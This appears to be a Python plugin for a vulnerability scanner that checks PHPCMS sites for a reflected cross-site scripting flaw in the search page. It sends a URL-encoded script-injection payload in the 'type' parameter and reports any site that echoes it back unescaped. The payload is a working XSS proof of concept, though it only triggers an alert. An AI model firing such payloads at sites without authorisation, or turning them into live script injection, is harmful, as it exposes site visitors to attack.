#!/usr/bin/env python 
# -*- coding: utf-8 -*-
# Author     : 果果
# PlugName   : PHPCMS 搜索跨站脚本漏洞
# References : http://sebug.net/vuldb/ssvid-19058

def assign(service, arg):
    if service == "phpcms" :
        return True, arg

def audit(arg):
    url = arg 
    payload = "search/?type=%22%3E%3Cscript%3ealert(1234567890)%3c%2fscript%3e&q=rose&s=%CB%D1%CB%F7"
    url += payload 
    code, head, res, errcode, final_url = curl.curl(url)
    if code == 200 and "<script>alert(1234567890)</script>" in res:
        security_info(url) 

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpcms', 'http://www.example.com/')[1])